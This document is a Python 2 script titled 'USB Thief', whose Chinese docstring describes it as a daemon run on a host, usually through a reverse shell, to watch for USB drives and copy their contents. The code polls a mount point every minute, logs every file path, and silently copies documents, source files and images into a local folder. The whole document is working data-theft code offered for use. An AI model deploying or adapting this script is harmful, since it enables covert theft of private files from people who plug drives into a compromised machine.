#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
用于监听并复制U盘内容的 daemon
通常是 reverse shell 到 host 上使用
Usage:
Python usbthief.py &
"""
import os
import sys
import time
import shutil
import string


def banner():
    print """
        +----------------------------------------+
        +               USB Thief                         +
        +                           by thehackercat                     +
        +----------------------------------------+
        =========================================="""


if sys.platform.lower() == "darwin":
    print 'MacOS system env detected'
    USB = '/Volumes/'
if sys.platform.lower() == "win32":
    print 'Windows system env detected'
    USB = 'G:\\' 
if sys.platform.lower() == "linux2":
    print 'Linux system env detected'
    USB = '/mnt/usb/'

current_path = os.getcwd()
save_path = current_path+"/copy/"
if not os.path.exists(save_path):
    try:
        os.mkdir(save_path)
    except:
        print 'Failed to create copied files dir'

SAVE = save_path  # copied file path
OLD = []
# file types to copy
word = "txt,doc,ppt,py,java,cpp,html,js,css,json,md,xls,pdf," \
       "ms10,pdf,jpg,jpeg,png,gif,TXT,DOC,PPT,PY,JAVA,CPP,HTML," \
       "JS,CSS,MD,XLS,PDF,MS10,PDF,JPG,JPEG,PNG,GIF".split(",")[:-1]


# is_need_copy checker
def value(file):
    if not os.path.isfile(file):
        return False
    for i in word:
        if string.find(file, i) > -1:
            return True
    return False


# Copy files suffix with timestamp
def copyfile(file, filename):
    print SAVE+time.strftime("%m%d%H%M", time.localtime(time.time()))+filename
    shutil.copy(file, SAVE+time.strftime("%m%d%H%M", time.localtime(time.time()))+"#"+filename)


# Walk USB and copy files
def usb_walker():
    if not os.path.exists(SAVE):
        os.mkdir(SAVE)
    print "Start walking USB files"
    f = open(SAVE+time.strftime("%m%d%H%M", time.localtime(time.time()))+".txt", "w")
    for root, dirs, files in os.walk(USB):
        for file in files:
            export = os.path.join(root, file)
            f.writelines(export+'\n')
            try:
                if value(export):
                    print "Coping current file #" + export
                    copyfile(export,file)
            except:
                 print("File has been ignored")
    f.close()
    print "Done coping files"


# diff usb content by length
def getusb():
    global OLD
    NEW = os.listdir(USB)
    if len(NEW) == len(OLD):
        print "No content changes"
        return False
    else:
        OLD = NEW
        return True


def theif_loop():
    banner()
    sleep_time = 60  # loop interval
    while (True):
        if os.path.exists(USB):
            print "USB device detected"
            if getusb():
                try:
                    usb_walker()
                except Exception, e:
                    print "Unknown error"
                    print(str(e))
        else:
            print "No USB device detected"
        print "Start sleeping..."
        print "Sleep time: {sleep_time}s".format(sleep_time=sleep_time)
        time.sleep(sleep_time)  # Sleep for a while
        print "End sleeping, next try..."


if __name__ == "__main__":
    theif_loop()